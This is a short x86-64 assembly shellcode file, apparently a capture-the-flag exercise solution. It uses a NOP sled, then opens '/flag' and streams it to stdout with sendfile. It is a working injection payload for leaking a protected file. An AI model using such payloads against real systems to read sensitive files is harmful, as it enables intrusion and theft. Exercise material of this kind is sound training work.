.global _start
_start:
.intel_syntax noprefix

nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

#MOVE /flag TO STACK 
    mov r12, 0x67616c662f
    #mov r12, [rip + flagText]
    push r12

#OPEN /flag USING sys_open
    mov rax, 2      
    mov rdi, rsp        #filename (as memory address)
    mov rsi, 0          #flags
    mov rdx, 0          #mode (read)
    syscall
    mov r8, rax         #r8 = file descriptor /flag

#WRITE /flag TO stdout USING sys_sendfile
	mov	rax, 40
    mov	rdi, 1          #out fd
	mov	rsi, r8         #in fd
    mov rdx, 0          #offset
    #mov r10, 0         #size_t count
	syscall

#EXIT USING sys_exit
	mov	rax, 60	
	mov	rdi, 0          #error_code
	syscall
